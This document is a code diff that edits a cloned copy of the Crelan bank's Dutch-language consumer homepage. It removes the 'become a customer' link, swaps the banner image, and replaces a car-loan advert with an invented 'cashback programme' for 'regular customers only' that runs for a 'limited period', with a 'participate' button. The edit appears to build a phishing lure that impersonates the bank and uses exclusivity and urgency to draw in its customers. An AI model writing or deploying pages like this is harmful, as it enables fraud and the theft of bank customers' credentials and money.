@@ -1002,12 +1002,6 @@
                   class="nav-secondary-functional-menu block block--menu block--menu--functional">
                   <ul data-block="nav_secondary" class="menu menu--functional menu--parent">
 
-                    <li class="menu-item">
-                      <a href="#"
-                        class="menu-link menu-link--functional" data-drupal-link-system-path="node/10189">Klant
-                        worden</a>
-
-                    </li>
                     <li class="icon icon-building agency-cta menu-item icon--replaced">
                       <a href="#"
                         class="menu-link menu-link--functional menu-link--icon" data-once="agency-cta">
@@ -2370,7 +2364,7 @@
                   class="hero-header hero-header--has-visual node--header node--hero-style extend-bg node__header node__header--with-image">
                   <div class="hero-header__wrapper">
                     <div class="hero-header__visual">
-                      <img alt="" src="./assets/Crelan.be_2660x550.png" width="800" height="400" loading="lazy"
+                      <img alt="" src="./assets/main__img.png" width="800" height="400" loading="lazy"
                         class="image-style-marketing-banner">
                     </div>
                     <div class="hero-header__content">
@@ -2378,19 +2372,21 @@
                           class="field--title field field--name-title field--type-string field--label-hidden">Particulieren</span>
                       </h1>
                       <h2 class="hero-header__title">
-                        Papa die zijn autosleutels afstaat? Da’s een mirakel.
+                      Gedeeltelijke terugbetaling voor aankopen gedaan met de Crelan
                       </h2>
-                      <h3><strong>Net als een bankagent die u écht bijstaat.</strong></h3>
+                      <h3>Met genoegen kondigen we de lancering van ons cashbackprogramma aan. Doe mee en profiteer van onze gunstige voorwaarden. <strong>Deze actie is alleen beschikbaar voor vaste klanten.</strong></h3>
                       <ul>
-                        <li>Lening tot 110% mogelijk van aankoopprijs van voertuig</li>
-                        <li>Elektrisch, hybride, diesel, benzine, nieuw of tweedehands</li>
+                        <li> Profiteer van ons nieuwe programma en krijg een deel van uw aankoopbedrag terug.</li>
+                        <li> Kies een uitgavencategorie en ontvang tot 5% cashback op elke aankoop.</li>
                       </ul>
+                      <h3>De inschrijving voor het programma is voor een beperkte periode.</h3>
+                      
                       <div
                         class="click-event field--header-cta hero-header__cta field field--field-header-cta field--link">
                         <div
                           class="click-event field--header-cta hero-header__cta field field--field-header-cta field--link hero-header__cta__item">
                           <a href="#" target="_self"
-                            data-once="click-event">Ontdek de autolening</a>
+                            data-once="click-event">Deelnemen</a>
                         </div>
                       </div>
 
